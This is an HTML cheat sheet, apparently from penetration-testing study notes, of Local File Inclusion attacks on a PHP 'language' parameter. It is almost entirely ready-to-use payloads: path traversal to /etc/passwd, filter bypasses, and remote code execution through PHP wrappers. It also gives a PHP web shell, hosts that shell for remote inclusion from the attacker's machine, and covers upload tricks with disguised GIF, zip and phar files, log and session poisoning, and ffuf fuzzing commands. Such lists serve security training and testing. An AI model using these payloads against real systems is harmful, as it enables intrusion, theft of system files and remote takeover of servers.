<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Cheat Sheet Summary Table</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Cheat Sheet Summary Table</h1><br/><br /><br /><h2>Local File Inclusion</h2><br /><table class="table"><tr><th>Command</th><th>Description</th></tr></table><br /><table class="table"><tr><th>Basic LFI</th><th> </th></tr><tr><td>/index.php?language=/etc/passwd</td><td>Basic LFI</td></tr><tr><td>/index.php?language=../../../../etc/passwd</td><td>LFI with path traversal</td></tr><tr><td>/index.php?language=/../../../etc/passwd</td><td>LFI with name prefix</td></tr><tr><td>/index.php?language=./languages/../../../../etc/passwd</td><td>LFI with approved path</td></tr></table><br /><table class="table"><tr><th>LFI Bypasses</th><th> </th></tr><tr><td>/index.php?language=....//....//....//....//etc/passwd</td><td>Bypass basic path traversal filter</td></tr><tr><td>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</td><td>Bypass filters with URL encoding</td></tr><tr><td>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</td><td>Bypass appended extension with path truncation (obsolete)</td></tr><tr><td>/index.php?language=../../../../etc/passwd%00</td><td>Bypass appended extension with null byte (obsolete)</td></tr><tr><td>/index.php?language=php://filter/read=convert.base64-encode/resource=config</td><td>Read PHP with base64 filter</td></tr></table><br /><br /><br /><br /><h2>Remote Code Execution</h2><br /><table class="table"><tr><th>Command</th><th>Description</th></tr></table><br /><table class="table"><tr><th>PHP Wrappers</th><th> </th></tr><tr><td>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</td><td>RCE with data wrapper</td></tr><tr><td>curl -s -X POST --data &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot;</td><td>RCE with input wrapper</td></tr><tr><td>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;</td><td>RCE with expect wrapper</td></tr></table><br /><table class="table"><tr><th>RFI</th><th> </th></tr><tr><td>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</td><td>Host web shell</td></tr><tr><td>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</td><td>Include remote PHP web shell</td></tr></table><br /><table class="table"><tr><th>LFI + Upload</th><th> </th></tr><tr><td>echo &#39;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.gif</td><td>Create malicious image</td></tr><tr><td>/index.php?language=./profile_images/shell.gif&amp;cmd=id</td><td>RCE with malicious uploaded image</td></tr><tr><td>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php</td><td>Create malicious zip archive &#39;as jpg&#39;</td></tr><tr><td>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</td><td>RCE with malicious uploaded zip</td></tr><tr><td>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</td><td>Create malicious phar &#39;as jpg&#39;</td></tr><tr><td>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</td><td>RCE with malicious uploaded phar</td></tr></table><br /><table class="table"><tr><th>Log Poisoning</th><th> </th></tr><tr><td>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</td><td>Read PHP session parameters</td></tr><tr><td>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</td><td>Poison PHP session with web shell</td></tr><tr><td>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</td><td>RCE through poisoned PHP session</td></tr><tr><td>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -A &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</td><td>Poison server log</td></tr><tr><td>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</td><td>RCE through poisoned PHP session</td></tr></table><br /><br /><br /><br /><h2>Misc</h2><br /><table class="table"><tr><th>Command</th><th>Description</th></tr><tr><td>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#39; -fs 2287</td><td>Fuzz page parameters</td></tr><tr><td>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#39; -fs 2287</td><td>Fuzz LFI payloads</td></tr><tr><td>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#39; -fs 2287</td><td>Fuzz webroot path</td></tr><tr><td>ffuf -w ./LFI-WordList-Linux:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#39; -fs 2287</td><td>Fuzz server configurations</td></tr></table><br /><br /><br /><br /><br /></div>
</body>
</html>
